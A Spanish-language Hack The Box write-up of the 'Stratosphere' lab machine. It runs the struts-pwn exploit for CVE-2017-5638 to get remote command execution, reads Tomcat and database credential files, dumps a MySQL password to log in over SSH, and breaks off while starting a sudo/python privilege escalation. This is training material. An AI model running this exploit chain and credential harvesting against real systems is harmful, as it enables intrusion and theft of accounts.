---
title: Stratosphere
description: Máquina Stratosphere de Hackthebox
date: 2024-07-06 23:50:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - CVE-2017-5638
  - Abusing Sudoers
  - Python
  - Library Hijacking
  - Apache Struts Exploitation
image:
  path: /assets/img/Stratosphere/Stratosphere.png
---

## Skills

- Apache Struts Exploitation (CVE-2017-5638)
- Python Library Hijacking (Privilege Escalation)
- Python Abusing Sudoers (Privilege Escalation)
  
## Certificaciones

- eJPT
- eWPT
  
## Descripción

`Stratosphere` es una máquina `medium linux` donde estaremos vulnerando la máquina a través de un `rce` (remote code execution), el cual obtenemos al `explotar` el `CVE-2017-5638` de `Struts`. Mediante el rce `accedemos` a la `base de datos` y `obtenemos` las `credenciales` de acceso al `ssh` de la máquina víctima, una vez dentro nos convertimos en usuario root `abusando` del `sudoers`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.252.189
PING 10.129.252.189 (10.129.252.189) 56(84) bytes of data.
64 bytes from 10.129.252.189: icmp_seq=1 ttl=63 time=63.2 ms
64 bytes from 10.129.252.189: icmp_seq=2 ttl=63 time=60.5 ms
^C
--- 10.129.252.189 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 60.490/61.847/63.205/1.357 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.252.189 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 20:05 CEST
Initiating SYN Stealth Scan at 20:05
Scanning 10.129.252.189 [65535 ports]
Discovered open port 80/tcp on 10.129.252.189
Discovered open port 22/tcp on 10.129.252.189
Discovered open port 8080/tcp on 10.129.252.189
Completed SYN Stealth Scan at 20:06, 39.55s elapsed (65535 total ports)
Nmap scan report for 10.129.252.189
Host is up (0.064s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.64 seconds
           Raw packets sent: 196629 (8.652MB) | Rcvd: 35 (1.620KB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 22,80,8080 10.129.252.189 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 20:08 CEST
Nmap scan report for 10.129.252.189
Host is up (0.088s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495651"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1874
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or decept
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495651"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1874
|     Date: Sat, 06 Jul 2024 18:08:35 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or decept
|_http-title: Stratosphere
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=7/6%Time=66898823%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\
SF:x20W/\"1708-1519762495651\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x202
SF:018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:
SF:\x201708\r\nDate:\x20Sat,\x2006\x20Jul\x202024\x2018:08:35\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\
SF:x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratospher
SF:e</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background
SF:\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20
SF:<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-w
SF:rap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i
SF:></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\
SF:n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>
SF:\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"co
SF:ntainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x
SF:20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1
SF:>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted
SF:\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20cl
SF:ass=\"ar")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20OPTIONS,
SF:\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nDate:\x20Sat,\x200
SF:6\x20Jul\x202024\x2018:08:35\x20GMT\r\nConnection:\x20close\r\n\r\n")%r
SF:(RTSPRequest,7EE,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;ch
SF:arset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201874\r\nDa
SF:te:\x20Sat,\x2006\x20Jul\x202024\x2018:08:35\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x2
SF:0Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=
SF:\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h
SF:2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{fon
SF:t-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20
SF:p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;
SF:background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20
SF:Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"line
SF:\"\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x20I
SF:nvalid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol</p><p><b>
SF:Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20proc
SF:ess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20percei
SF:ved\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20re
SF:quest\x20syntax,\x20invalid\x20request\x20message\x20framing,\x20or\x20
SF:decept");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=7/6%Time=66898823%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag
SF::\x20W/\"1708-1519762495651\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x2
SF:02018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Lengt
SF:h:\x201708\r\nDate:\x20Sat,\x2006\x20Jul\x202024\x2018:08:35\x20GMT\r\n
SF:Connection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x2
SF:0\x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosph
SF:ere</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text
SF:/css\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"backgrou
SF:nd\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x
SF:20<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content
SF:-wrap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"><
SF:/i></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a
SF:>\n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</di
SF:v>\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"
SF:container\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20
SF:\x20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</
SF:h1>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStart
SF:ed\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20
SF:class=\"ar")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20OPTION
SF:S,\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2
SF:006\x20Jul\x202024\x2018:08:35\x20GMT\r\nConnection:\x20close\r\n\r\n")
SF:%r(RTSPRequest,7EE,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201874\r\n
SF:Date:\x20Sat,\x2006\x20Jul\x202024\x2018:08:35\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\
SF:x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20typ
SF:e=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x2
SF:0h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{f
SF:ont-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x
SF:20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1p
SF:x;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x
SF:20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"li
SF:ne\"\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x2
SF:0Invalid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20request\x20message\x20framing,\x20or\x
SF:20decept");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
```

### Web Enumeration

El servicio web en el `puerto 80` y en el `puerto 8080` son `exactamente` las `mismas` páginas `web`

![](/assets/img/Stratosphere/image_1.png)

`Fuzzeamos` en busca de rutas

```
wfuzz -c -t200 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.252.189/FUZZ      
 /home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.252.189/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000004875:   302        0 L      0 W        0 Ch        "manager"                                                                                                             
000013276:   302        0 L      0 W        0 Ch        "Monitoring"                
```

Cuando accedemos a `http://10.129.252.189/Monitoring` vemos esta página

![](/assets/img/Stratosphere/image_2.png)

Si accedemos a `http://10.129.252.189/manager` nos aparece lo siguiente

![](/assets/img/Stratosphere/image_3.png)

Al cancelar vemos lo siguiente, por lo tanto ya sabemos que hay un `tomcat` corriendo

![](/assets/img/Stratosphere/image_4.png)

Identificamos la `versión` del `tomcat`, en este caso es la versión `8.5.54`

```
# curl -s http://10.129.252.189:8080/docs/ | grep Tomcat    
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;docs&#47;</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/8.5.54 (Debian)</h3></body></html>
```

He `fuzzeado` rutas y no he encontrado nada, por lo tanto he hecho la siguiente `búsqueda` en google `.action exploit`, debido a que esa `extensión` es bastante `curiosa`. Esta es la `primera` `búsqueda` que nos `sale`

![](/assets/img/Stratosphere/image_5.png)

Al `no` poder `comprobar` la `version` del `struts` hay que ir probando `exploit` hasta dar con el indicado, en esta caso hemos tenido suerte y hemos dado con el a la primera. Lo que debemos hacer es `clonarnos` el `repositorio` de `github`

```
# git clone https://github.com/mazen160/struts-pwn
```

`Ejecutamos` el `exploit` y obtenemos `ejecución remota de comandos`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'id' 
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
```

He intentado establecerme una `reverse shell` pero no ha sido posible, por lo tanto voy a `listar` el `contenido` de la máquina víctima

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'ls -a'  
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: ls -a
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

.
..
conf
db_connect
lib
logs
policy
webapps
work
```

`Listamos` el contenido de `/conf`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'ls conf'           
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: ls conf
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

Catalina
catalina.properties
context.xml
jaspic-providers.xml
logging.properties
policy.d
server.xml
server.xml.dpkg-dist
tomcat-users.xml
web.xml
web.xml.dpkg-dist

[%] Done.
```

`Visualizamos` el contenido de `tomcat-users.xml` y obtenemos un `usuario` y `contraseña`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'cat conf/tomcat-users.xml'           
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: cat conf/tomcat-users.xml
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />
</tomcat-users>

[%] Done.
```

He probado varias combinaciones para el panel de `/manger/html`, con el objetivo de autenticarme y subir un `.war malicioso` con el que ganar `acceso` a la `máquina víctima` pero `no` ha sido `posible`. Por lo tanto vamos a visualizar el contenido de `db_connect`, donde obtenemos varias `credenciales` para la `base de datos`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'cat db_connect'    
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: cat db_connect
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

[%] Done.
```

Ahora que tenemos las credenciales, vamos a `conectarnos` a la `base de datos` mediante el rce del que disponemos y a `listar` las `bases de datos` disponibles

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "show databases;"'   
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: mysql -uadmin -padmin -e "show databases;"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

Database
information_schema
users

[%] Done.
```

`Listamos tablas` de la `base de datos` de `users`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; show tables;"'      
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: mysql -uadmin -padmin -e "use users; show tables;"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

Tables_in_users
accounts

[%] Done.
```

`Listamos columnas` de la `tabla accounts` en la `base de datos users`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; describe accounts;"'        
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: mysql -uadmin -padmin -e "use users; describe accounts;"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

Field   Type    Null    Key     Default Extra
fullName        varchar(45)     YES             NULL    
password        varchar(30)     YES             NULL    
username        varchar(20)     YES             NULL    

[%] Done.
```

Obtenemos el contenido de las columnas `username` y `password` de la `tabla accounts` y de la `base de datos accounts`

```
# python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; select password,username from accounts;"'             
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

[*] URL: http://10.129.252.189/Monitoring/example/Welcome.action
[*] CMD: mysql -uadmin -padmin -e "use users; select password,username from accounts;"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

password        username
9tc*rhKuG5TyXvUJOrE^5CK7k       richard

[%] Done.
```

## Intrusión

Accedemos por `ssh` a la máquina víctima con las `credenciales` conseguidas a través de `mysql`

```
#  ssh richard@10.129.252.189   
richard@10.129.252.189's password: 
Linux stratosphere 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec  3 12:20:42 2023 from 10.10.10.2
richard@stratosphere:~$ whoami
richard
```

## Privilege Escalation (First Method)

Vemos que nuestro usuario puede ejecutar `python` con `sudo` siempre y cuando ejecute un archivo que está en nuestro directorio `/home`

```
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

`Aunque` el `propietario` sea `root`, está en nuestro directorio `/home`,  en el cual tenemos permisos `rwx` para todo, por lo tanto podemos `eliminar` el `archivo`

```
